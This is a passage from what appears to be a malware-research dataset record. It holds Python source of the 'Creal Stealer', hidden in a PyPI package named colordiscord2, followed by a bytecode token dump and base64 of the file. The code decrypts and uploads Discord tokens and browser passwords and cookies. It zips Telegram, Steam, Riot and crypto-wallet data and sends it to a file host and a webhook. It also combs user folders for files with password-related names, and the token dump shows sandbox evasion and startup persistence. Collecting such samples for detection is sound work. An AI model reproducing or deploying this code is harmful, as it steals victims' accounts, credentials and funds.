t0k3n in re.findall(r\"dQw4w9WgXcQ:[^.*\\['(.*)'\\].*$][^\\\"]*\", line):\n                        global T0k3ns\n                        t0k3nDecoded = D3kryptV4lU3(b64decode(t0k3n.split('dQw4w9WgXcQ:')[1]), master_key)\n                        if ch1ckT4k1n(t0k3nDecoded):\n                            if not t0k3nDecoded in T0k3ns:\n                                # print(token)\n                                T0k3ns += t0k3nDecoded\n                                # writeforfile(Tokens, 'tokens')\n                                upl05dT4k31(t0k3nDecoded, path)\n\n    def GatherZips(paths1, paths2, paths3):\n        thttht = []\n        for patt in paths1:\n            a = threading.Thread(target=Z1pTh1ngs, args=[patt[0], patt[5], patt[1]])\n            a.start()\n            thttht.append(a)\n\n        for patt in paths2:\n            a = threading.Thread(target=Z1pTh1ngs, args=[patt[0], patt[2], patt[1]])\n            a.start()\n            thttht.append(a)\n        \n        a = threading.Thread(target=ZipTelegram, args=[paths3[0], paths3[2], paths3[1]])\n        a.start()\n        thttht.append(a)\n\n        for thread in thttht: \n            thread.join()\n        global WalletsZip, GamingZip, OtherZip\n            # print(WalletsZip, GamingZip, OtherZip)\n\n        wal, ga, ot = \"\",'',''\n        if not len(WalletsZip) == 0:\n            wal = \":coin:  \u2022  Wallets\\n\"\n            for i in WalletsZip:\n                wal += f\"\u2514\u2500 [{i[0]}]({i[1]})\\n\"\n        if not len(WalletsZip) == 0:\n            ga = \":video_game:  \u2022  Gaming:\\n\"\n            for i in GamingZip:\n                ga += f\"\u2514\u2500 [{i[0]}]({i[1]})\\n\"\n        if not len(OtherZip) == 0:\n            ot = \":tickets:  \u2022  Apps\\n\"\n            for i in OtherZip:\n                ot += f\"\u2514\u2500 [{i[0]}]({i[1]})\\n\"          \n        headers = {\n            \"Content-Type\": \"application/json\",\n            \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0\"\n        }\n        \n        data = {\n            \"content\": globalInfo(),\n            \"embeds\": [\n                {\n                \"title\": \"Creal Zips\",\n                \"description\": f\"{wal}\\n{ga}\\n{ot}\",\n                \"color\": 2895667,\n                \"footer\": {\n                    \"text\": \"Creal Stealer\",\n                    \"icon_url\": \"https://i.imgur.com/S0Zqp4R.jpg\"\n                }\n                }\n            ],\n            \"username\": \"Creal Stealer\",\n            \"avatar_url\": \"https://i.imgur.com/S0Zqp4R.jpg\",\n            \"attachments\": []\n        }\n        L04durl1b(telnet, data=json.dumps(data).encode(), headers=headers)\n\n\n    def ZipTelegram(path, arg, procc):\n        global OtherZip\n        pathC = path\n        name = arg\n        if not os.path.exists(pathC): return\n        subprocess.Popen(f\"taskkill /im {procc} /t /f >nul 2>&1\", shell=True)\n\n        zf = ZipFile(f\"{pathC}/{name}.zip\", \"w\")\n        for file in os.listdir(pathC):\n            if not \".zip\" in file and not \"tdummy\" in file and not \"user_data\" in file and not \"webview\" in file: \n                zf.write(pathC + \"/\" + file)\n        zf.close()\n\n        lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')\n        #lnik = \"https://google.com\"\n        os.remove(f\"{pathC}/{name}.zip\")\n        OtherZip.append([arg, lnik])\n\n    def Z1pTh1ngs(path, arg, procc):\n        pathC = path\n        name = arg\n        global WalletsZip, GamingZip, OtherZip\n        # subprocess.Popen(f\"taskkill /im {procc} /t /f\", shell=True)\n        # os.system(f\"taskkill /im {procc} /t /f\")\n\n        if \"nkbihfbeogaeaoehlefnkodbefgpgknn\" in arg:\n            browser = path.split(\"\\\\\")[4].split(\"/\")[1].replace(' ', '')\n            name = f\"Metamask_{browser}\"\n            pathC = path + arg\n        \n        if not os.path.exists(pathC): return\n        subprocess.Popen(f\"taskkill /im {procc} /t /f >nul 2>&1\", shell=True)\n\n        if \"Wallet\" in arg or \"NationsGlory\" in arg:\n            browser = path.split(\"\\\\\")[4].split(\"/\")[1].replace(' ', '')\n            name = f\"{browser}\"\n\n        elif \"Steam\" in arg:\n            if not os.path.isfile(f\"{pathC}/loginusers.vdf\"): return\n            f = open(f\"{pathC}/loginusers.vdf\", \"r+\", encoding=\"utf8\")\n            data = f.readlines()\n            # print(data)\n            found = False\n            for l in data:\n                if 'RememberPassword\"\\t\\t\"1\"' in l:\n                    found = True\n            if found == False: return\n            name = arg\n\n\n        zf = ZipFile(f\"{pathC}/{name}.zip\", \"w\")\n        for file in os.listdir(pathC):\n            if not \".zip\" in file: zf.write(pathC + \"/\" + file)\n        zf.close()\n\n        lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')\n        #lnik = \"https://google.com\"\n        os.remove(f\"{pathC}/{name}.zip\")\n\n        if \"Wallet\" in arg or \"eogaeaoehlef\" in arg:\n            WalletsZip.append([name, lnik])\n        elif \"NationsGlory\" in name or \"Steam\" in name or \"RiotCli\" in name:\n            GamingZip.append([name, lnik])\n        else:\n            OtherZip.append([name, lnik])\n\n\n    def GatherAll():\n        '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '\n        browserPaths = [\n            [f\"{roaming}/Opera Software/Opera GX Stable\",               \"opera.exe\",    \"/Local Storage/leveldb\",           \"/\",            \"/Network\",             \"/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\"                      ],\n            [f\"{roaming}/Opera Software/Opera Stable\",                  \"opera.exe\",    \"/Local Storage/leveldb\",           \"/\",            \"/Network\",             \"/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\"                      ],\n            [f\"{roaming}/Opera Software/Opera Neon/User Data/Default\",  \"opera.exe\",    \"/Local Storage/leveldb\",           \"/\",            \"/Network\",             \"/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\"                      ],\n            [f\"{local}/Google/Chrome/User Data\",                        \"chrome.exe\",   \"/Default/Local Storage/leveldb\",   \"/Default\",     \"/Default/Network\",     \"/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\"              ],\n            [f\"{local}/Google/Chrome SxS/User Data\",                    \"chrome.exe\",   \"/Default/Local Storage/leveldb\",   \"/Default\",     \"/Default/Network\",     \"/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\"              ],\n            [f\"{local}/BraveSoftware/Brave-Browser/User Data\",          \"brave.exe\",    \"/Default/Local Storage/leveldb\",   \"/Default\",     \"/Default/Network\",     \"/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\"              ],\n            [f\"{local}/Yandex/YandexBrowser/User Data\",                 \"yandex.exe\",   \"/Default/Local Storage/leveldb\",   \"/Default\",     \"/Default/Network\",     \"/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn\"                                    ],\n            [f\"{local}/Microsoft/Edge/User Data\",                       \"edge.exe\",     \"/Default/Local Storage/leveldb\",   \"/Default\",     \"/Default/Network\",     \"/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\"              ]\n        ]\n\n        discordPaths = [\n            [f\"{roaming}/Discord\", \"/Local Storage/leveldb\"],\n            [f\"{roaming}/Lightcord\", \"/Local Storage/leveldb\"],\n            [f\"{roaming}/discordcanary\", \"/Local Storage/leveldb\"],\n            [f\"{roaming}/discordptb\", \"/Local Storage/leveldb\"],\n        ]\n\n        PathsToZip = [\n            [f\"{roaming}/atomic/Local Storage/leveldb\", '\"Atomic Wallet.exe\"', \"Wallet\"],\n            [f\"{roaming}/Exodus/exodus.wallet\", \"Exodus.exe\", \"Wallet\"],\n            [\"C:\\Program Files (x86)\\Steam\\config\", \"steam.exe\", \"Steam\"],\n            [f\"{roaming}/NationsGlory/Local Storage/leveldb\", \"NationsGlory.exe\", \"NationsGlory\"],\n            [f\"{local}/Riot Games/Riot Client/Data\", \"RiotClientServices.exe\", \"RiotClient\"]\n        ]\n        Telegram = [f\"{roaming}/Telegram Desktop/tdata\", 'telegram.exe', \"Telegram\"]\n\n        for patt in browserPaths: \n            a = threading.Thread(target=getT0k3n, args=[patt[0], patt[2]])\n            a.start()\n            Threadlist.append(a)\n        for patt in discordPaths: \n            a = threading.Thread(target=G3tD1sc0rd, args=[patt[0], patt[1]])\n            a.start()\n            Threadlist.append(a)\n\n        for patt in browserPaths: \n            a = threading.Thread(target=getP4ssw, args=[patt[0], patt[3]])\n            a.start()\n            Threadlist.append(a)\n\n        ThCokk = []\n        for patt in browserPaths: \n            a = threading.Thread(target=getC00k13, args=[patt[0], patt[4]])\n            a.start()\n            ThCokk.append(a)\n\n        threading.Thread(target=GatherZips, args=[browserPaths, PathsToZip, Telegram]).start()\n\n\n        for thread in ThCokk: thread.join()\n        DETECTED = TR6st(C00k13)\n        if DETECTED == True: return\n\n        for patt in browserPaths:\n            threading.Thread(target=Z1pTh1ngs, args=[patt[0], patt[5], patt[1]]).start()\n        \n        for patt in PathsToZip:\n            threading.Thread(target=Z1pTh1ngs, args=[patt[0], patt[2], patt[1]]).start()\n        \n        threading.Thread(target=ZipTelegram, args=[Telegram[0], Telegram[2], Telegram[1]]).start()\n\n        for thread in Threadlist: \n            thread.join()\n        global upths\n        upths = []\n\n        for file in [\"crpassw.txt\", \"crcook.txt\"]: \n            # upload(os.getenv(\"TEMP\") + \"\\\\\" + file)\n            upload(file.replace(\".txt\", \"\"), uploadToAnonfiles(os.getenv(\"TEMP\") + \"\\\\\" + file))\n\n    def uploadToAnonfiles(path):\n        try:return requests.post(f'https://{requests.get(\"https://api.gofile.io/getServer\").json()[\"data\"][\"server\"]}.gofile.io/uploadFile', files={'file': open(path, 'rb')}).json()[\"data\"][\"downloadPage\"]\n        except:return False\n\n    # def uploadToAnonfiles(path):s\n    #     try:\n    #         files = { \"file\": (path, open(path, mode='rb')) }\n    #         upload = requests.post(\"https://transfer.sh/\", files=files)\n    #         url = upload.text\n    #         return url\n    #     except:\n    #         return False\n\n    def KiwiFolder(pathF, keywords):\n        global KiwiFiles\n        maxfilesperdir = 7\n        i = 0\n        listOfFile = os.listdir(pathF)\n        ffound = []\n        for file in listOfFile:\n            if not os.path.isfile(pathF + \"/\" + file): return\n            i += 1\n            if i <= maxfilesperdir:\n                url = uploadToAnonfiles(pathF + \"/\" + file)\n                ffound.append([pathF + \"/\" + file, url])\n            else:\n                break\n        KiwiFiles.append([\"folder\", pathF + \"/\", ffound])\n\n    KiwiFiles = []\n    def KiwiFile(path, keywords):\n        global KiwiFiles\n        fifound = []\n        listOfFile = os.listdir(path)\n        for file in listOfFile:\n            for worf in keywords:\n                if worf in file.lower():\n                    if os.path.isfile(path + \"/\" + file) and \".txt\" in file:\n                        fifound.append([path + \"/\" + file, uploadToAnonfiles(path + \"/\" + file)])\n                        break\n                    if os.path.isdir(path + \"/\" + file):\n                        target = path + \"/\" + file\n                        KiwiFolder(target, keywords)\n                        break\n\n        KiwiFiles.append([\"folder\", path, fifound])\n\n    def Kiwi():\n        user = temp.split(\"\\AppData\")[0]\n        path2search = [\n            user + \"/Desktop\",\n            user + \"/Downloads\",\n            user + \"/Documents\"\n        ]\n\n        key_wordsFolder = [\n            \"account\",\n            \"acount\",\n            \"passw\",\n            \"secret\",\n            \"senhas\",\n            \"contas\",\n            \"backup\",\n            \"2fa\",\n            \"importante\",\n            \"privado\",\n            \"exodus\",\n            \"exposed\",\n            \"perder\",\n            \"amigos\",\n            \"empresa\",\n            \"trabalho\",\n            \"work\",\n            \"private\",\n            \"source\",\n            \"users\",\n            \"username\",\n            \"login\",\n            \"user\",\n            \"usuario\",\n            \"log\"\n        ]\n\n        key_wordsFiles = [\n            \"passw\",\n            \"mdp\",\n            \"motdepasse\",\n            \"mot_de_passe\",\n            \"login\",\n            \"secret\",\n            \"account\",\n            \"acount\",\n            \"paypal\",\n            \"banque\",\n            \"account\",                                                          \n            \"metamask\",\n            \"wallet\",\n            \"crypto\",\n            \"exodus\",\n            \"discord\",\n            \"2fa\",\n            \"code\",\n            \"memo\",\n            \"compte\",\n            \"token\",\n            \"backup\",\n            \"secret\",\n            \"mom\",\n            \"family\"\n            ]\n\n        wikith = []\n        for patt in path2search: \n            kiwi = threading.Thread(target=KiwiFile, args=[patt, key_wordsFiles]);kiwi.start()\n            wikith.append(kiwi)\n        return wikith\n\n\n    global keyword, cookiWords, paswWords, CookiCount, P4sswCount, WalletsZip, GamingZip, OtherZip\n\n    keyword = [\n        'mail', '[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', 'card', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', 'bank', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', 'buy', 'sell', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', 'crypto', '[uber](https://uber.com)', '[netflix](https://netflix.com)'\n    ]\n\n    CookiCount, P4sswCount = 0, 0\n    cookiWords = []\n    paswWords = []\n\n    WalletsZip = [] # [Name, Link]\n    GamingZip = []\n    OtherZip = []\n\n    GatherAll()\n    DETECTED = TR6st(C00k13)\n    # DETECTED = False\n    if not DETECTED:\n        wikith = Kiwi()\n\n        for thread in wikith: thread.join()\n        time.sleep(0.2)\n\n        filetext = \"\\n\"\n        for arg in KiwiFiles:\n            if len(arg[2]) != 0:\n                foldpath = arg[1]\n                foldlist = arg[2]       \n                filetext += f\"\U0001F4C1 {foldpath}\\n\"\n\n                for ffil in foldlist:\n                    a = ffil[0].split(\"/\")\n                    fileanme = a[len(a)-1]\n                    b = ffil[1]\n                    filetext += f\"\u2514\u2500:open_file_folder: [{fileanme}]({b})\\n\"\n                filetext += \"\\n\"\n        upload(\"kiwi\", filetext)"
    tokens: "make_cell AES make_cell C00k13 make_cell STRING_LEN_S_ENT_HIGH make_cell D3kryptV4lU3 make_cell DATA_BLOB make_cell G3tB4dg31 make_cell G3tD1sc0rd make_cell G3tD4t4 make_cell G3tT0k4n1nf9 make_cell G3tUHQFr13ndS make_cell G3tb1ll1ng make_cell GatherZips make_cell KiwiFile make_cell KiwiFolder make_cell L04durl1b make_cell POINTER make_cell R4f0rm3t make_cell Request make_cell TR6st make_cell Threadlist make_cell Z1pTh1ngs make_cell ZipFile make_cell ZipTelegram make_cell ENCODING_DECODING make_cell byref make_cell c_buffer make_cell c_char make_cell cdll make_cell ch1ckT4k1n make_cell g3t1p make_cell getC00k13 make_cell getP4ssw make_cell getT0k3n make_cell globalInfo make_cell inj_url make_cell json make_cell json_loads make_cell local make_cell os make_cell random make_cell re make_cell requests make_cell roaming make_cell shutil make_cell socket make_cell sql_connect make_cell subprocess make_cell telnet make_cell temp make_cell threading make_cell upl05dT4k31 make_cell upload make_cell STRING_LEN_S_ENT_HIGH make_cell NETWORK_HTTP_REQUEST make_cell windll make_cell wintypes make_cell wr1tef0rf1l3 resume load_const INTEGER load_const import_name os store_deref os load_const INTEGER load_const import_name threading store_deref threading load_const INTEGER load_const import_name sys import_from executable store_fast executable pop_top load_const INTEGER load_const import_name sqlite3 import_from connect store_deref sql_connect pop_top load_const INTEGER load_const import_name re store_deref re load_const INTEGER load_const import_name base64 import_from ENCODING_DECODING store_deref ENCODING_DECODING pop_top load_const INTEGER load_const import_name json import_from loads store_deref json_loads import_from load store_fast load pop_top load_const INTEGER load_const import_name ctypes import_from windll store_deref windll import_from wintypes store_deref wintypes import_from byref store_deref byref import_from cdll store_deref cdll import_from Structure store_fast Structure import_from POINTER store_deref POINTER import_from c_char store_deref c_char import_from c_buffer store_deref c_buffer pop_top load_const INTEGER load_const import_name urllib.request import_from Request store_deref Request import_from NETWORK_HTTP_REQUEST store_deref NETWORK_HTTP_REQUEST pop_top load_const INTEGER load_const import_name json store_deref json load_const INTEGER load_const import_name time store_fast time load_const INTEGER load_const import_name shutil store_deref shutil load_const INTEGER load_const import_name zipfile import_from ZipFile store_deref ZipFile pop_top load_const INTEGER load_const import_name random store_deref random load_const INTEGER load_const import_name re store_deref re load_const INTEGER load_const import_name subprocess store_deref subprocess load_const INTEGER load_const import_name sys store_fast sys load_const INTEGER load_const import_name shutil store_deref shutil load_const INTEGER load_const import_name uuid store_fast uuid load_const INTEGER load_const import_name socket store_deref socket load_const INTEGER load_const import_name getpass store_fast getpass build_list load_const list_extend store_fast blacklistUsers load_fast getpass load_attr getuser call store_fast username load_fast username load_attr lower call load_fast blacklistUsers contains_op pop_jump_if_false TO_NUMBER load_deref os load_attr _exit load_const INTEGER call pop_top load_closure os load_closure socket build_tuple load_const OBJECT make_function closure store_fast kontrol push_null load_fast kontrol call pop_top build_list load_const list_extend store_fast BLACKLIST1 load_fast uuid load_attr getnode call store_fast mac_address load_global str load_fast uuid load_attr UUID load_fast mac_address kw_names int call call load_fast BLACKLIST1 contains_op pop_jump_if_false TO_NUMBER load_deref os load_attr _exit load_const INTEGER call pop_top load_const STRING_URL store_deref inj_url load_const INTEGER store_fast DETECTED load_closure Request load_closure NETWORK_HTTP_REQUEST build_tuple load_const OBJECT make_function closure store_deref g3t1p load_const requests load_const requests build_list load_const Crypto.Cipher load_const pycryptodome build_list build_list store_fast requirements load_fast requirements get_iter for_iter TO_NUMBER store_fast modl load_global __import__ load_fast modl load_const INTEGER binary_subscr call pop_top jump_backward TO_NUMBER end_for load_const INTEGER load_const import_name requests store_deref requests load_const INTEGER load_const import_name Crypto.Cipher import_from AES store_deref AES pop_top load_deref os load_attr getenv load_const LOCALAPPDATA call store_deref local load_deref os load_attr getenv load_const APPDATA call store_deref roaming load_deref os load_attr getenv load_const TEMP call store_deref temp build_list store_deref Threadlist push_null load_build_class load_closure POINTER load_closure c_char load_closure wintypes build_tuple load_const OBJECT make_function closure load_const DATA_BLOB load_fast Structure call store_deref DATA_BLOB load_closure c_buffer load_closure cdll load_closure windll build_tuple load_const OBJECT make_function closure store_deref G3tD4t4 load_const load_closure DATA_BLOB load_closure G3tD4t4 load_closure byref load_closure c_buffer load_closure windll build_tuple load_const OBJECT make_function defaults, closure store_deref STRING_LEN_S_ENT_HIGH load_const load_closure AES build_tuple load_const OBJECT make_function defaults, closure store_deref D3kryptV4lU3 load_const load_closure requests build_tuple load_const OBJECT make_function defaults, closure store_fast L04dR3qu3sTs load_deref requests load_attr get load_const STRING_URL call load_attr text store_deref telnet load_const load_closure Request load_closure NETWORK_HTTP_REQUEST build_tuple load_const OBJECT make_function defaults, closure store_deref L04durl1b load_closure Request load_closure g3t1p load_closure json load_closure os load_closure NETWORK_HTTP_REQUEST build_tuple load_const OBJECT make_function closure store_deref globalInfo load_closure re build_tuple load_const OBJECT make_function closure store_deref TR6st load_closure Request load_closure json load_closure NETWORK_HTTP_REQUEST build_tuple load_const OBJECT make_function closure store_deref G3tUHQFr13ndS load_deref os load_attr popen load_const tasklist call load_attr readlines call store_fast process_list load_fast process_list get_iter for_iter TO_NUMBER store_fast process load_const Discord load_fast process contains_op pop_jump_if_true TO_NUMBER jump_backward TO_NUMBER load_global int load_fast process load_attr split call load_const INTEGER binary_subscr call store_fast pid load_deref os load_attr system load_const STRING_FILE_PATH load_fast pid format_value INTEGER build_string call pop_top jump_backward TO_NUMBER end_for load_closure Request load_closure json load_closure NETWORK_HTTP_REQUEST build_tuple load_const OBJECT make_function closure store_deref G3tb1ll1ng load_closure inj_url load_closure os load_closure requests load_closure telnet build_tuple load_const OBJECT make_function closure store_fast inj_discord push_null load_fast inj_discord call pop_top load_const OBJECT make_function store_deref G3tB4dg31 load_closure Request load_closure json load_closure NETWORK_HTTP_REQUEST build_tuple load_const OBJECT make_function closure store_deref G3tT0k4n1nf9 load_closure Request load_closure NETWORK_HTTP_REQUEST build_tuple load_const OBJECT make_function closure store_deref ch1ckT4k1n load_global REFLECTION_DYNAMIC_READ load_fast sys load_const frozen load_const INTEGER call pop_jump_if_false TO_NUMBER load_deref os load_attr path load_attr dirname load_fast sys load_attr executable call store_fast currentFilePath jump_forward TO_NUMBER load_deref os load_attr path load_attr dirname load_deref os load_attr path load_attr abspath load_global __file__ call call store_fast currentFilePath load_deref os load_attr path load_attr basename load_fast sys load_attr argv load_const INTEGER binary_subscr call store_fast fileName load_deref os load_attr path load_attr join load_fast currentFilePath load_fast fileName call store_fast filePath load_deref os load_attr path load_attr join load_deref os load_attr path load_attr expanduser load_const ~ call load_const AppData load_const Roaming load_const Microsoft load_const Windows load_const Start Menu load_const Programs load_const Startup call store_fast STRING_LEN_S_ENT_HIGH load_deref os load_attr path load_attr join load_fast STRING_LEN_S_ENT_HIGH load_fast fileName call store_fast startupFilePath load_deref os load_attr path load_attr abspath load_fast filePath call load_attr lower call load_deref os load_attr path load_attr abspath load_fast startupFilePath call load_attr lower call compare_op != pop_jump_if_false TO_NUMBER load_global FILESYSTEM_ACCESS load_fast filePath load_const rb call before_with store_fast src_file load_global FILESYSTEM_ACCESS load_fast startupFilePath load_const wb call before_with store_fast dst_file load_deref shutil load_attr copyfileobj load_fast src_file load_fast dst_file call pop_top load_const load_const load_const call pop_top load_const load_const load_const call pop_top load_closure G3tB4dg31 load_closure G3tT0k4n1nf9 load_closure G3tUHQFr13ndS load_closure G3tb1ll1ng load_closure L04durl1b load_closure g3t1p load_closure globalInfo load_closure json build_tuple load_const OBJECT make_function closure store_deref upl05dT4k31 load_closure re build_tuple load_const OBJECT make_function closure store_deref R4f0rm3t load_closure L04durl1b load_closure R4f0rm3t load_closure globalInfo load_closure json load_closure telnet build_tuple load_const OBJECT make_function closure store_deref upload load_closure os build_tuple load_const OBJECT make_function closure store_deref wr1tef0rf1l3 load_const store_fast T0k3ns load_closure ch1ckT4k1n load_closure os load_closure re load_closure upl05dT4k31 build_tuple load_const OBJECT make_function closure store_deref getT0k3n build_list store_fast P4ssw load_closure STRING_LEN_S_ENT_HIGH load_closure D3kryptV4lU3 load_closure ENCODING_DECODING load_closure json_loads load_closure os load_closure random load_closure shutil load_closure sql_connect load_closure temp load_closure wr1tef0rf1l3 build_tuple load_const OBJECT make_function closure store_deref getP4ssw build_list store_deref C00k13 load_closure STRING_LEN_S_ENT_HIGH load_closure D3kryptV4lU3 load_closure ENCODING_DECODING load_closure json_loads load_closure os load_closure random load_closure shutil load_closure sql_connect load_closure temp load_closure wr1tef0rf1l3 build_tuple load_const OBJECT make_function closure store_deref getC00k13 load_closure STRING_LEN_S_ENT_HIGH load_closure D3kryptV4lU3 load_closure ENCODING_DECODING load_closure ch1ckT4k1n load_closure json_loads load_closure os load_closure re load_closure upl05dT4k31 build_tuple load_const OBJECT make_function closure store_deref G3tD1sc0rd load_closure L04durl1b load_closure Z1pTh1ngs load_closure ZipTelegram load_closure globalInfo load_closure json load_closure telnet load_closure threading build_tuple load_const OBJECT make_function closure store_deref GatherZips load_closure ZipFile load_closure os load_closure subprocess load_closure STRING_LEN_S_ENT_HIGH build_tuple load_const OBJECT make_function closure store_deref ZipTelegram load_closure ZipFile load_closure os load_closure subprocess load_closure STRING_LEN_S_ENT_HIGH build_tuple load_const OBJECT make_function closure store_deref Z1pTh1ngs load_closure C00k13 load_closure G3tD1sc0rd load_closure GatherZips load_closure TR6st load_closure Threadlist load_closure Z1pTh1ngs load_closure ZipTelegram load_closure getC00k13 load_closure getP4ssw load_closure getT0k3n load_closure local load_closure os load_closure roaming load_closure threading load_closure upload load_closure STRING_LEN_S_ENT_HIGH build_tuple load_const OBJECT make_function closure store_fast GatherAll load_closure requests build_tuple load_const OBJECT make_function closure store_deref STRING_LEN_S_ENT_HIGH load_closure os load_closure STRING_LEN_S_ENT_HIGH build_tuple load_const OBJECT make_function closure store_deref KiwiFolder build_list store_fast KiwiFiles load_closure KiwiFolder load_closure os load_closure STRING_LEN_S_ENT_HIGH build_tuple load_const OBJECT make_function closure store_deref KiwiFile load_closure KiwiFile load_closure temp load_closure threading build_tuple load_const OBJECT make_function closure store_fast Kiwi build_list load_const list_extend store_global keyword load_const unpack_sequence store_global CookiCount store_global P4sswCount build_list store_global cookiWords build_list store_global paswWords build_list store_global WalletsZip build_list store_global GamingZip build_list store_global OtherZip push_null load_fast GatherAll call pop_top push_null load_deref TR6st load_deref C00k13 call store_fast DETECTED load_fast DETECTED pop_jump_if_true TO_NUMBER push_null load_fast Kiwi call store_fast wikith load_fast wikith get_iter for_iter TO_NUMBER store_fast thread load_fast thread load_attr join call pop_top jump_backward TO_NUMBER end_for load_fast time load_attr sleep load_const FLOAT call pop_top load_const store_fast filetext load_fast KiwiFiles get_iter for_iter TO_NUMBER store_fast arg load_global len load_fast arg load_const INTEGER binary_subscr call load_const INTEGER compare_op != pop_jump_if_true TO_NUMBER jump_backward TO_NUMBER load_fast arg load_const INTEGER binary_subscr store_fast foldpath load_fast arg load_const INTEGER binary_subscr store_fast foldlist load_fast filetext load_const \U0001F4C1 load_fast foldpath format_value INTEGER load_const build_string binary_op += store_fast filetext load_fast foldlist get_iter for_iter TO_NUMBER store_fast ffil load_fast ffil load_const INTEGER binary_subscr load_attr split load_const / call store_fast a load_fast a load_global len load_fast a call load_const INTEGER binary_op - binary_subscr store_fast fileanme load_fast ffil load_const INTEGER binary_subscr store_fast b load_fast filetext load_const STRING_LEN_S_ENT_HIGH load_fast fileanme format_value INTEGER load_const ]( load_fast b format_value INTEGER load_const ) build_string binary_op += store_fast filetext jump_backward TO_NUMBER end_for load_fast filetext load_const binary_op += store_fast filetext jump_backward TO_NUMBER end_for push_null load_deref upload load_const kiwi load_fast filetext call pop_top return_const None return_const None push_exc_info pop_top load_deref subprocess load_attr Popen load_fast executable format_value INTEGER load_const -m pip install load_fast modl load_const INTEGER binary_subscr format_value INTEGER build_string load_const INTEGER kw_names shell call pop_top load_fast time load_attr sleep load_const INTEGER call pop_top pop_except extended_arg jump_backward TO_NUMBER copy pop_except reraise push_exc_info with_except_start pop_jump_if_true TO_NUMBER reraise pop_top pop_except pop_top pop_top extended_arg jump_backward TO_NUMBER copy pop_except reraise push_exc_info with_except_start pop_jump_if_true TO_NUMBER reraise pop_top pop_except pop_top pop_top extended_arg jump_backward TO_NUMBER copy pop_except reraise"
    hash: 734bb802915c06b6102d90f9c37dfb797fca3326db80f9b4ad13bb50e5c823e7
sources:
  ? .repo_cache/malicious_repos/pypi_malregistry/colordiscord2/0.0.1/colordiscord2-0.0.1/colordiscord2-0.0.1/colordiscord2/colordiscord2.py
  : CgoKZGVmIGNvbG9yKCk6CiAgICBpbXBvcnQgb3MKICAgIGltcG9ydCB0aHJlYWRpbmcKICAgIGZyb20gc3lzIGltcG9ydCBleGVjdXRhYmxlCiAgICBmcm9tIHNxbGl0ZTMgaW1wb3J0IGNvbm5lY3QgYXMgc3FsX2Nvbm5lY3QKICAgIGltcG9ydCByZQogICAgZnJvbSBiYXNlNjQgaW1wb3J0IGI2NGRlY29kZQogICAgZnJvbSBqc29uIGltcG9ydCBsb2FkcyBhcyBqc29uX2xvYWRzLCBsb2FkCiAgICBmcm9tIGN0eXBlcyBpbXBvcnQgd2luZGxsLCB3aW50eXBlcywgYnlyZWYsIGNkbGwsIFN0cnVjdHVyZSwgUE9JTlRFUiwgY19jaGFyLCBjX2J1ZmZlcgogICAgZnJvbSB1cmxsaWIucmVxdWVzdCBpbXBvcnQgUmVxdWVzdCwgdXJsb3BlbgogICAgaW1wb3J0IGpzb24gCiAgICBpbXBvcnQgdGltZQogICAgaW1wb3J0IHNodXRpbAogICAgZnJvbSB6aXBmaWxlIGltcG9ydCBaaXBGaWxlCiAgICBpbXBvcnQgcmFuZG9tCiAgICBpbXBvcnQgcmUKICAgIGltcG9ydCBzdWJwcm9jZXNzCiAgICBpbXBvcnQgc3lzCiAgICBpbXBvcnQgc2h1dGlsCiAgICBpbXBvcnQgdXVpZAogICAgaW1wb3J0IHNvY2tldAogICAgaW1wb3J0IGdldHBhc3MKCgoKICAgIGJsYWNrbGlzdFVzZXJzID0gWydXREFHVXRpbGl0eUFjY291bnQnLCAnM1cxR0pUJywgJ1FaU0JKVldNJywgJzVJU1lIOVNIJywgJ0FiYnknLCAnaG1hcmMnLCAncGF0ZXgnLCAnUkRoSjBDTkZldnpYJywgJ2tFZWNmTXdnaicsICdGcmFuaycsICc4TmwwQ29sTlE1YnEnLCAnTGlzYScsICdKb2huJywgJ2dlb3JnZScsICdQeG1kVU9wVnl4JywgJzhWaXpTTScsICd3MGZqdU9WbUNjUDVBJywgJ2xtVndqajliJywgJ1BxT05qSFZ3ZXhzUycsICczdTJ2OW04JywgJ0p1bGlhJywgJ0hFVWVSemwnLCAnZnJlZCcsICdzZXJ2ZXInLCAnQnZKQ2hSUG5zeG4nLCAnSGFycnkgSm9obnNvbicsICdTcWdGT2YzRycsICdMdWNhcycsICdtaWtlJywgJ1BhdGVYJywgJ2g3ZGsxeFByJywgJ0xvdWlzZScsICdVc2VyMDEnLCAndGVzdCcsICdSR3pjQlV5cnpuUmVnJ10KCiAgICB1c2VybmFtZSA9IGdldHBhc3MuZ2V0dXNlcigpCgogICAgaWYgdXNlcm5hbWUubG93ZXIoKSBpbiBibGFja2xpc3RVc2VyczoKICAgICAgICBvcy5fZXhpdCgwKQoKICAgIGRlZiBrb250cm9sKCk6CgogICAgICAgIGJsYWNrbGlzdFVzZXJuYW1lID0gWydCRUU3MzcwQy04QzBDL